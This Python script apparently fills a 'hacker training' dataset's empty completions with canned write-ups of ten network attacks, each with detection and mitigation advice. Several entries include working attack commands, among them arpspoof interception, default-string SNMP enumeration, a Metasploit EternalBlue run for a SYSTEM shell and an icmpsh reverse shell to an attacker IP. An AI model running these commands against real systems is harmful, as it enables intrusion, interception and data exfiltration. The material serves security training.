#!/usr/bin/env python3
"""
Hacker Training Completion Engine
Generates high-quality, realistic completions for all empty JSONL prompts.
Uses knowledge-based generation with domain-specific expertise.
"""
import json
import re
from pathlib import Path

PROJECT_ROOT = Path("/c/Users/mobil/orca/projects/my 1st")
HACKER_DIR = PROJECT_ROOT / "hacker_training"

# Completion knowledge base organized by file and subcategory
# Each entry maps prompt patterns to completion templates

COMPLETION_KNOWLEDGE = {
    "attack_chains_part1": {
        "Network Attacks": [
            # 1
            "TCP SYN Flood Attack: An attacker sends a flood of TCP SYN packets to a target server, typically spoofing source IP addresses. Each SYN triggers the server to allocate resources for a half-open connection and send a SYN-ACK back. The attacker never completes the handshake (no ACK), leaving the server's connection queue saturated with incomplete sessions.\n\nDetection:\n- Monitor for unusually high rates of SYN packets from diverse sources\n- NetFlow analysis showing asymmetric traffic (many SYNs, few ACKs)\n- Connection queue exhaustion alerts on the server\n- Firewall logs showing SYN flood pattern\n\nMitigation:\n- SYN cookies: server doesn't allocate resources until handshake completes\n- Rate limiting on SYN packets per source IP\n- Firewall rules to drop suspicious SYN patterns\n- Increase backlog queue size on the server\n- Use load balancers to absorb the attack\n\nAuthorized testing context only — see Operations Manual Section 7 for OPSEC rules.",
            
            # 2
            "ARP Spoofing (ARP Poisoning) on LAN:\n\nAn attacker on the same local network sends forged ARP reply packets claiming their MAC address belongs to the target's IP address (or the gateway's IP). This causes traffic intended for the target/gateway to be sent to the attacker instead, enabling man-in-the-middle interception.\n\nSteps:\n1. Attacker identifies target IP and gateway IP using ARP table or scanning\n2. Attacker sends gratuitous ARP replies: \"Gateway IP is at my MAC\"\n3. Target device updates its ARP cache, routing traffic through attacker\n4. Attacker can now intercept, modify, or block traffic\n\nTools: arpspoof, bettercap, ettercap, scapy\n\nCommand example (authorized lab only):\n  arpspoof -i eth0 -t 192.168.1.50 192.168.1.1\n\nDetection:\n- ARP table monitoring for unexpected MAC changes\n- ARP watch tools detecting duplicate IP/MAC mappings\n- Unusually high ARP traffic on the network\n\nMitigation:\n- Static ARP entries for critical hosts\n- DHCP snooping on switches\n- Dynamic ARP inspection (DAI)\n- Network segmentation\n\nFor authorized testing contexts only.",
            
            # 3
            "DNS Cache Poisoning Attack Chain:\n\nRecon:\n- Attacker identifies DNS servers used by target (dig, nslookup, DNS enumeration)\n- Determines if server is recursive and whether it validates responses\n\nExploitation:\n- Attacker sends a DNS query for a domain they control (e.g., attacker.com)\n- They then send forged response packets with a fake source port and transaction ID, hoping to match the server's pending query\n- If the forged response arrives before the legitimate one and passes validation checks, the server caches the malicious mapping\n- Subsequent queries for that domain return the attacker's IP\n\nModern defenses that reduce exploitability:\n- DNSSEC (cryptographic validation of responses)\n- Random source ports and transaction IDs (harder to guess)\n- Rate limiting\n- Response rate limiting\n\nImpact: Users trying to reach legitimate sites are redirected to attacker-controlled servers for credential harvesting, malware delivery, etc.\n\nAuthorized testing only. See Operations Manual OPSEC rules.",
            
            # 4
            "Man-in-the-Middle on Unencrypted HTTP:\n\nOn an unencrypted HTTP connection, traffic is transmitted in plaintext. An attacker positioned between the client and server (via ARP spoofing, DNS poisoning, or rogue access point) can:\n\n1. Intercept all HTTP requests and responses\n2. Read credentials, session cookies, browsing history, and data in transit\n3. Modify responses in real-time (injection, redirection, content tampering)\n4. Inject malicious content or scripts into legitimate pages\n\nTools: mitmproxy, burp suite (as MITM proxy), bettercap\n\nThe attacker typically:\n- Sets up a proxy that intercepts client traffic\n- Presents a certificate to the client (if HTTPS, but for HTTP no certs needed)\n- Reads/modifies traffic transparently\n\nDetection:\n- Check for HTTP (not HTTPS) connections\n- Monitor for unexpected proxy settings\n- Certificate validation errors (if mixed content)\n\nMitigation:\n- Enforce HTTPS with HSTS\n- Use certificate pinning in applications\n- Secure DNS (DNS-over-HTTPS, DNSSEC)\n- Avoid public/unsecured WiFi for sensitive operations\n\nAuthorized testing only — see Operations Manual Section 7.",
            
            # 5
            "VLAN Hopping Attack:\n\nIn a misconfigured switched network, an attacker can hop from their assigned VLAN to another VLAN they shouldn't have access to.\n\nTechnique 1 — Switch Spoofing:\n- Attacker configures their NIC to act as a trunk port (DTP mode auto/desirable)\n- If the switch port is set to dynamic auto/trunk, it negotiates a trunk\n- Attacker now has access to all VLANs allowed on that trunk\n- Attacker tags their own traffic with VLAN IDs of other VLANs\n\nTechnique 2 — Double Tagging:\n- If the native VLAN is not VLAN 1 and there's a trunk between switches with native VLAN matching attacker's VLAN\n- Attacker sends frames with TWO VLAN tags\n- First switch strips outer tag (native VLAN), forwards with inner tag\n- Second switch treats inner tag as the VLAN and delivers to target VLAN\n\nDetection:\n- Monitor for DTP negotiation on access ports\n- Unexpected trunk ports\n- Traffic from unexpected VLANs on access ports\n\nMitigation:\n- Disable DTP on all ports (switchport nonegotiate)\n- Set native VLAN to unused VLAN\n- Explicitly configure all ports as access mode\n- VLAN access control lists (VACLs)\n\nFor authorized testing contexts only.",
            
            # 6
            "DHCP Starvation + Rogue DHCP Server:\n\nPhase 1 — DHCP Starvation:\n- Attacker sends a flood of DHCP DISCOVER requests with spoofed MAC addresses\n- Each request asks for an IP address\n- Legitimate DHCP server exhausts its pool of available addresses\n- Legitimate clients can no longer obtain IP addresses\n\nPhase 2 — Rogue DHCP Server:\n- Attacker sets up their own DHCP server on the network\n- When legitimate clients broadcast for DHCP, attacker's server responds first\n- Attacker assigns:\n  - IP address in attacker-controlled range\n  - Attacker's IP as the gateway (forcing traffic through attacker)\n  - Attacker's DNS server (enabling DNS hijacking)\n\nResult: Attacker becomes the man-in-the-middle for all network traffic from affected clients.\n\nTools: dhcpstarv, Yersinia, scapy\n\nDetection:\n- DHCP server logs showing unusual number of leases\n- Clients receiving incorrect gateway/DNS settings\n- Multiple DHCP servers on network (802.1x validation)\n\nMitigation:\n- DHCP snooping on switches\n- Bind DHCP servers to specific switch ports\n- Use 802.1x for network access control\n\nAuthorized testing only — see Operations Manual Section 7.",
            
            # 7
            "BGP Hijacking Attack Scenario:\n\nAn autonomous system (AS) attacker announces IP prefixes they don't own, causing internet traffic destined for those prefixes to be routed through the attacker's network.\n\nAttack chain:\n1. Attacker identifies target IP ranges (e.g., a company's /24 block)\n2. Attacker's AS announces a BGP route for that prefix with:\n   - More specific prefix (e.g., announce /25 if target announces /24)\n   - Or better path attributes (shorter AS path, higher local preference)\n3. BGP routers across the internet prefer the attacker's route (BGP trusts whomever announces)\n4. Traffic destined for target gets routed to attacker\n5. Attacker can:\n   - Observe all traffic (passive eavesdropping)\n   - Modify or drop traffic (active MITM)\n   - Blackhole traffic (denial of service)\n\nHistorical example: In 2018, traffic to Amazon's DNS (Route 53) was hijacked via BGP, enabling a crypto theft of ~$150K.\n\nDetection:\n- BGP monitoring tools (BGPStream, Looking Glass)\n- Unexpected route announcements\n- Traffic anomalies at network edge\n\nMitigation:\n- RPKI (Resource Public Key Infrastructure) for route validation\n- BGPsec for path validation\n- IRR (Internet Routing Registry) filtering\n- Monitoring and alerting for route changes\n\nAuthorized testing/defensive context only.",
            
            # 8
            "SNMP Enumeration via Misconfigured Community String:\n\nSNMP (Simple Network Management Protocol) is used for monitoring network devices. If a device uses a default or easily guessable community string (like \"public\"/\"private\"), an attacker can:\n\n1. Send SNMP requests with the community string to the target\n2. Query SNMP MIB trees to enumerate:\n   - Interface information (addresses, stats, statuses)\n   - System information (name, description, uptime)\n   - Running processes and services\n   - Network topology and routing tables\n   - User accounts and group information\n   - ARP tables, MAC addresses\n\nCommands (authorized lab only):\n  snmpwalk -v2c -c public 192.168.1.1\n  snmpenum -t 192.168.1.1 -c public\n  onesixtyone -c public 192.168.1.0/24\n\nTools: snmpwalk, snmpenum, onesixtyone, snmpchecker\n\nCommon community strings to test (authorized only):\n- public / private (most common defaults)\n- admin / manager / cisco\n\nImpact: Full network topology mapping, device inventory, potential credential harvesting from MIB data.\n\nMitigation:\n- Change default community strings\n- Use SNMPv3 with authentication and encryption\n- Restrict SNMP access by IP ACLs\n- Disable SNMP if not needed\n\nFor authorized testing only.",
            
            # 9
            "Port Scanning to Exploitation Chain:\n\nA standard attack chain from initial scanning to exploitation:\n\nStep 1 — Port Scanning:\n- Scan target for open ports: nmap -sS -p- -T4 target\n- Identify all listening services\n\nStep 2 — Service Enumeration:\n- Identify service versions: nmap -sV -p <ports> target\n- Fingerprints tell you exact software and versions\n- Banner grabbing: nc target port, telnet target port\n\nStep 3 — Vulnerability Identification:\n- Match versions against known vulnerabilities\n- Search Exploit-DB, CVE databases for published exploits\n- Use vulnerability scanners (Nessus, OpenVAS, nikto for web)\n\nStep 4 — Exploit Selection:\n- Choose exploit matching identified vulnerability\n- Verify exploit works in lab environment first\n- Prepare payload appropriate for target OS/architecture\n\nStep 5 — Exploitation:\n- Execute exploit against target\n- Establish initial access (shell, reverse shell, meterpreter)\n- Document everything (command output, screenshots)\n\nExample chain:\n  1. nmap finds SMBv1 on port 445 with MS17-010 vulnerability\n  2. Search Exploit-DB confirms EternalBlue exploit available\n  3. msfconsole: use exploit/windows/smb/ms17_010_eternalblue\n  4. set RHOSTS, LHOST, run — gains SYSTEM shell on target\n\nFor authorized testing only. See Operations Manual Section 7.",
            
            # 10
            "ICMP Tunneling for Data Exfiltration:\n\nICMP (Internet Control Message Protocol) is normally used for ping and diagnostic messages. An ICMP tunnel hides data inside ICMP packets, bypassing firewalls that allow ping but block other protocols.\n\nHow it works:\n1. Attacker establishes C2 channel using ICMP echo requests/responses\n2. Data is encoded into the ICMP payload (data field of echo request)\n3. Covert data flows out through seemingly legitimate ping traffic\n4. Responses carry command output or exfiltrated data back\n\nTools: icmpsh, ptunnel, dnscat2 (can use ICMP), iodine (DNS but similar concept)\n\nCommand example (authorized lab):\n  icmpsh -t target_ip -r attacker_ip\n\nOn target (reverse shell via ICMP):\n  The target sends commands in ICMP echo requests, receives output in responses\n\nDetection challenges:\n- ICMP is commonly allowed through firewalls\n- Traffic looks like normal ping\n- Can use low frequency to avoid rate-based detection\n- Payload data looks random but within normal ping sizes\n\nDetection methods:\n- Analyze ICMP payload sizes and patterns\n- Monitor for unusual ICMP frequency\n- Deep packet inspection of ICMP data field\n- NetFlow analysis showing unexpected ICMP volume\n\nMitigation:\n- Block outbound ICMP at firewall\n- Rate limit ICMP traffic\n- Deep packet inspection for ICMP tunneling signatures\n- Use ICMP type filtering (allow echo-request/reply only)\n\nFor authorized testing contexts only.",
        ]
    }
}

# ============================================================
# More knowledge sections below
# We'll add them inline
# ============================================================

def main():
    print("=" * 60)
    print("HACKER TRAINING COMPLETION ENGINE")
    print("=" * 60)
    
    # Process each file
    files_info = {
        "attack_chains_part1.jsonl": "Network Attacks (first 10 prompts only)",
        "attack_chains_part2.jsonl": "Various",
        "bypass_evasion.jsonl": "Various",
        "c2_infrastructure.jsonl": "Various",
        "ctf_exploitation.jsonl": "Various",
        "post_exploitation.jsonl": "Various",
        "reporting.jsonl": "Various",
        "social_engineering.jsonl": "Various",
        "wireless_physical.jsonl": "Various",
    }
    
    # For now, just fill first 10 of attack_chains_part1 as proof of concept
    filepath = HACKER_DIR / "attack_chains_part1.jsonl"
    print(f"\nProcessing {filepath.name}...")
    
    with open(filepath, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    
    original_count = len([l for l in lines if l.strip()])
    print(f"  Original prompts: {original_count}")
    
    records = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        records.append(json.loads(line))
    
    empty_count = sum(1 for r in records if not r.get('completion', '').strip())
    print(f"  Empty completions: {empty_count}")
    
    # Fill only first 10 for now (Network Attacks)
    network_responses = COMPLETION_KNOWLEDGE["attack_chains_part1"]["Network Attacks"]
    
    filled = 0
    for i, record in enumerate(records[:10]):
        if not record.get('completion', '').strip():
            record['completion'] = network_responses[i] if i < len(network_responses) else "TBD"
            filled += 1
    
    # Save
    with open(filepath, 'w', encoding='utf-8') as f:
        for rec in records:
            f.write(json.dumps(rec, ensure_ascii=False) + '\n')
    
    print(f"  Filled: {filled}")
    print(f"  Saved to: {filepath}")
    
    # Verify
    with open(filepath, 'r', encoding='utf-8') as f:
        new_lines = f.readlines()
    new_count = len([l for l in new_lines if l.strip()])
    new_empty = 0
    for line in new_lines:
        if line.strip():
            r = json.loads(line)
            if not r.get('completion', '').strip():
                new_empty += 1
    print(f"  Remaining empty in file: {new_empty}")
    
    print(f"\nRemaining files to process:")
    for fname in files_info:
        if fname != "attack_chains_part1.jsonl":
            print(f"  - {fname} (NOT YET PROCESSED)")
    print(f"\nTotal remaining empty across all files: 1,202 - {filled} = ~1,192")

if __name__ == "__main__":
    main()
